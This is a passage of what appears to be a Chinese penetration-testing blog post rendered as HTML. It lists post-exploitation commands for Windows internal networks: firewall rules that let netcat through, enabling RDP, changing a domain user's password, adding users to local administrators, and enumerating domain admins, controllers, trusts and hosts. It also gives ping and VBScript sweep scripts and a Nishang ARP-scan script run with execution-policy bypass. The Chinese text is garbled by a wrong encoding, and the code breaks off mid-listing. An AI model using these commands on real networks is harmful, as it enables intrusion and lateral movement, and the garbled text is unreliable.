2003ä¹‹å‰ç‰ˆæœ¬å…è®¸æŒ‡å®šç¨‹åºè¿æ¥netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;c:\nc.exe&quot;    #server 2003ä¹‹åå…è®¸æŒ‡å®šç¨‹åºè¿›å…¥netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;c:\nc.exe&quot;    #server 2003ä¹‹åå…è®¸æŒ‡å®šç¨‹åºå‡ºå»netsh advfirewall firewall add rule name=&quot;RPC&quot; protocol=TCP dir=in localport=3389 action=allow #æ”¾è¡Œ3389netsh advfirewall set currentprofile logging filename &quot;c:\windows\temp\fw.log&quot;    #è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—æ–‡ä»¶ä½ç½®</span><br></pre></td></tr></table></figure><h3 id="26-æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ"><a href="#26-æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ" class="headerlink" title="26.æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ"></a>26.æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><h3 id="27-æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡"><a href="#27-æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡" class="headerlink" title="27.æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡"></a>27.æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber    #æŸ¥çœ‹è¿œç¨‹è¿æ¥ç«¯å£(RDP) 3389ç«¯å£åå…­è¿›åˆ¶ä¸º0xd3d</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #server 2003ç‰ˆæœ¬ä»¥ä¸‹å¼€å¯3389</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 0    #server 2003ç‰ˆæœ¬ä»¥ä¸‹å…³é—­3389</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #server 2003ç‰ˆæœ¬ä»¥ä¸Šå¼€å¯3389(win7å¯ä»¥)</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 0    #server 2003ç‰ˆæœ¬ä»¥ä¸Šå…³é—­3389</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1    #server 2008/2012ç‰ˆæœ¬å¼€å¯3389(win7ä¸å¯ä»¥)</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f    #server 2008/2012ç‰ˆæœ¬å¼€å¯3389</span><br></pre></td></tr></table></figure><h2 id="0x02-åŸŸå†…ä¿¡æ¯æ”¶é›†"><a href="#0x02-åŸŸå†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.åŸŸå†…ä¿¡æ¯æ”¶é›†"></a>0x02.åŸŸå†…ä¿¡æ¯æ”¶é›†</h2><h3 id="01-æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯"><a href="#01-æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯" class="headerlink" title="01.æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯"></a>01.æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user /domain    #æ˜¾ç¤ºæ‰€åœ¨åŸŸçš„ç”¨æˆ·åå•</span><br><span class="line">net user åŸŸç”¨æˆ· /domain    #è·å–åŸŸç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</span><br><span class="line">net user /domain xxx 123456    #ä¿®æ”¹åŸŸç”¨æˆ·å¯†ç ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™</span><br></pre></td></tr></table></figure><h3 id="02-æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨"><a href="#02-æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨" class="headerlink" title="02.æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨"></a>02.æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts /v</span><br></pre></td></tr></table></figure><h3 id="03-è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP"><a href="#03-è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP" class="headerlink" title="03.è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP"></a>03.è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nltest /dsgetdc:jiye</span><br><span class="line">nslookup -type=SRV _ldap._tcp    #æŸ¥çœ‹åŸŸæ§ä¸»æœºå</span><br><span class="line">netdom query pdc    #æŸ¥è¯¢åŸŸæ§</span><br></pre></td></tr></table></figure><h3 id="04-åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢"><a href="#04-åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢" class="headerlink" title="04.åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢"></a>04.åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain    #æŸ¥çœ‹åŸŸç®¡ç†å‘˜åˆ—è¡¨net group &quot;domain controllers&quot; /domain    #æŸ¥çœ‹åŸŸæ§åˆ¶å™¨(å¦‚æœæœ‰å¤šå°)net group &quot;domain computers&quot; /domain    #æŸ¥çœ‹åŸŸæœºå™¨net group &quot;domain users&quot; /domain    #æŸ¥çœ‹åŸŸå…¨éƒ¨ç”¨æˆ·net group /domain    #æŸ¥çœ‹åŸŸé‡Œå·¥ä½œç»„net localgroup administrators    #æŸ¥çœ‹æœ¬æœºç®¡ç†å‘˜[é€šå¸¸å«æœ‰åŸŸç”¨æˆ·]net localgroup administrators /domain    #ç™»å…¥æœ¬æœºçš„åŸŸç®¡ç†å‘˜net localgroup administrators workgroup\user /add    #åŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬æœº</span><br></pre></td></tr></table></figure><h2 id="04-è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯-åŸŸæ§"><a href="#04-è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯-åŸŸæ§" class="headerlink" title="04.è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯(åŸŸæ§)"></a>04.è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯(åŸŸæ§)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all    #è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯dsquery user        #æŸ¥çœ‹å­˜åœ¨ç”¨æˆ·dsquery computer    #æŸ¥è¯¢ç›®å½•ä¸­çš„è®¡ç®—æœºdsquery contact        #æŸ¥è¯¢ç›®å½•ä¸­çš„è”ç³»äººdsquery subnet        #æŸ¥è¯¢ç›®å½•ä¸­çš„å­ç½‘dsquery group        #æŸ¥è¯¢ç›®å½•ä¸­çš„ç»„dsquery ou            #æŸ¥è¯¢ç›®å½•ä¸­çš„ç»„ç»‡å•ä½dsquery site        #æŸ¥è¯¢ç›®å½•ä¸­çš„ç«™ç‚¹dsquery server        #æŸ¥è¯¢ç›®å½•ä¸­çš„AD DC/LDSå®ä¾‹dsquery user        #æŸ¥è¯¢ç›®å½•ä¸­çš„ç”¨æˆ·dsquery quota        #æŸ¥è¯¢ç›®å½•ä¸­çš„é…é¢è§„å®šdsquery partition    #æŸ¥è¯¢ç›®å½•ä¸­çš„åˆ†åŒºdsquery * -            #ç”¨é€šç”¨çš„LDAPæŸ¥è¯¢ç›®å½•ä¸­çš„ä»»ä½•å¯¹è±¡</span><br></pre></td></tr></table></figure><h3 id="05-åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢"><a href="#05-åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢" class="headerlink" title="05.åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢"></a>05.åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view    #æŸ¥çœ‹åŒä¸€åŸŸå†…æœºå™¨åˆ—è¡¨net view \\IP    #æŸ¥çœ‹æŸIPå…±äº«net view \\DC    #æŸ¥çœ‹DCè®¡ç®—æœºçš„å…±äº«èµ„æºåˆ—è¡¨net view /domain    #æŸ¥çœ‹å†…ç½‘å­˜åœ¨å¤šå°‘ä¸ªåŸŸnet view /domain:jiye    #æŸ¥çœ‹jiyeåŸŸä¸­çš„æœºå™¨åˆ—è¡¨</span><br></pre></td></tr></table></figure><h3 id="06-æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯"><a href="#06-æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯" class="headerlink" title="06.æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯"></a>06.æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><h3 id="07-åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨"><a href="#07-åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨" class="headerlink" title="07.åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨"></a>07.åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /allsysteminfonet config workstation    #å½“å‰ç™»å…¥åŸŸ</span><br></pre></td></tr></table></figure><h3 id="08-åˆ¤æ–­ä¸»åŸŸ"><a href="#08-åˆ¤æ–­ä¸»åŸŸ" class="headerlink" title="08.åˆ¤æ–­ä¸»åŸŸ"></a>08.åˆ¤æ–­ä¸»åŸŸ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domainæ‰§è¡Œä»¥ä¸Šå‘½ä»¤é€šå¸¸æœ‰ä¸‰ç§æƒ…å†µï¼š1.å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·ï¼Œä¼šå‡ºç°æ‹’ç»è®¿é—®ç»“æœ2.å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·ï¼Œå¾—åˆ°æ­£å¸¸è¾“å‡º3.å½“å‰ç¯å¢ƒä¸ºå·¥ä½œç»„ï¼Œä¸å­˜åœ¨åŸŸï¼Œä¼šå‡ºç°æ‰¾ä¸åˆ°åŸŸæ§ä¿¡æ¯</span><br></pre></td></tr></table></figure><h3 id="09-åˆ©ç”¨NetBios-ç½‘ç»œé‚»å±…-æ¢æµ‹å†…ç½‘"><a href="#09-åˆ©ç”¨NetBios-ç½‘ç»œé‚»å±…-æ¢æµ‹å†…ç½‘" class="headerlink" title="09.åˆ©ç”¨NetBios(ç½‘ç»œé‚»å±…)æ¢æµ‹å†…ç½‘"></a>09.åˆ©ç”¨NetBios(ç½‘ç»œé‚»å±…)æ¢æµ‹å†…ç½‘</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exeæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥æ‰«æå¼€æ”¾NetBiosåç§°æœåŠ¡å™¨nbtscan-1.0.35.exe 10.10.10.0/2410.10.10.10     JIYE\DC                         SHARING DC10.10.10.20     JIYE\WIN7DC1                    SHARING*timeout (normal end of scan)</span><br></pre></td></tr></table></figure><h3 id="10-ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘"><a href="#10-ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘" class="headerlink" title="10.ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘"></a>10.ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure><p><code>vbsè„šæœ¬æ¢æµ‹</code></p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">strSubNet = <span class="string">&quot;10.10.10.&quot;</span> </span><br><span class="line"><span class="keyword">Set</span> objFSO= <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>) </span><br><span class="line"><span class="keyword">Set</span> objTS = objfso.CreateTextFile(<span class="string">&quot;C:\Windows\Temp\Result.txt&quot;</span>)  </span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="number">254</span> </span><br><span class="line">strComputer = strSubNet &amp; i </span><br><span class="line">blnResult = Ping(strComputer) </span><br><span class="line"><span class="keyword">If</span> blnResult = <span class="literal">True</span> <span class="keyword">Then</span> </span><br><span class="line">objTS.WriteLine strComputer &amp; <span class="string">&quot; is alive ! :) &quot;</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"> <span class="keyword">Next</span>  </span><br><span class="line"> </span><br><span class="line">objTS.Close </span><br><span class="line">WScript.Echo <span class="string">&quot; All Ping scan, All Done!) &quot;</span>   </span><br><span class="line"><span class="keyword">Function</span> Ping(strComputer) </span><br><span class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">&quot;winmgmts:\\.\root\cimv2&quot;</span>) </span><br><span class="line"><span class="keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="string">&quot;&#x27;&quot;</span>) </span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> objItem <span class="keyword">In</span> colItems </span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">case</span> objItem.StatusCode </span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span> </span><br><span class="line">Ping = <span class="literal">True</span> </span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span> </span><br><span class="line">Ping = <span class="literal">False</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">select</span> </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">For</span> </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line">#cscript <span class="number">1.</span>vps æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h3 id="11-ARPæ‰«ææ¢æµ‹å†…ç½‘"><a href="#11-ARPæ‰«ææ¢æµ‹å†…ç½‘" class="headerlink" title="11.ARPæ‰«ææ¢æµ‹å†…ç½‘"></a>11.ARPæ‰«ææ¢æµ‹å†…ç½‘</h3><h4 id="01-arp-scanæ‰«æå·¥å…·"><a href="#01-arp-scanæ‰«æå·¥å…·" class="headerlink" title="01.arp-scanæ‰«æå·¥å…·"></a>01.arp-scanæ‰«æå·¥å…·</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure><h4 id="02-Empireä¸­çš„arpscanæ¨¡å—"><a href="#02-Empireä¸­çš„arpscanæ¨¡å—" class="headerlink" title="02.Empireä¸­çš„arpscanæ¨¡å—"></a>02.Empireä¸­çš„arpscanæ¨¡å—</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/situational_awareness/network/arpscan</span><br></pre></td></tr></table></figure><h4 id="03-Nishangä¸­çš„Invoke-ARPScan-ps1"><a href="#03-Nishangä¸­çš„Invoke-ARPScan-ps1" class="headerlink" title="03.Nishangä¸­çš„Invoke-ARPScan.ps1"></a>03.Nishangä¸­çš„Invoke-ARPScan.ps1</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -Command &quot;&amp; &#123;Import-Module C:\Users\Administrator\Desktop\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 10.10.10.0/24&#125;&quot; &gt;&gt; C:\Users\Administrator\Desktop\Result.txt</span><br></pre></td></tr></table></figure><p><code>Invoke-ARPScan.ps1å¦‚ä¸‹</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-ARPScan</span></span> &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">   Performs an ARP scan against a given range of IPv4 IP Addresses.</span></span><br><span class="line"><span class="comment">   Part of Posh-SecMod (https://github.com/darkoperator/Posh-SecMod/)</span></span><br><span class="line"><span class="comment">   Author: darkoperator</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">   Performs an ARP scan against a given range of IPv4 IP Addresses.</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">   Invoke an ARP Scan against a range of IPs specified in CIDR Format</span></span><br><span class="line"><span class="comment">    PS C:\&gt; Invoke-ARPScan -CIDR 172.20.10.1/24</span></span><br><span class="line"><span class="comment">    MAC                                                       Address                                                  </span></span><br><span class="line"><span class="comment">    ---                                                       -------                                                  </span></span><br><span class="line"><span class="comment">    14:10:9F:D5:1A:BF                                         172.20.10.2                                              </span></span><br><span class="line"><span class="comment">    00:0C:29:93:10:B5                                         172.20.10.3                                              </span></span><br><span class="line"><span class="comment">    00:0C:29:93:10:B5                                         172.20.10.15  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.LINK</span></span></span><br><span class="line"><span class="comment">https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">    <span class="keyword">param</span> (</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">ParameterSetName</span> = <span class="string">&quot;Range&quot;</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$Range</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">ParameterSetName</span> = <span class="string">&quot;CIDR&quot;</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$CIDR</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$false</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$MaxThreads</span>=<span class="number">50</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Begin</span> </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">New-IPv4Range</span></span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">            <span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a Start and End IP.</span></span><br><span class="line"><span class="comment">            <span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a Start and End IP.</span></span><br><span class="line"><span class="comment">            #&gt;</span></span><br><span class="line">            <span class="keyword">param</span>(</span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">                           <span class="variable">$StartIP</span>,</span><br><span class="line">                           </span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span 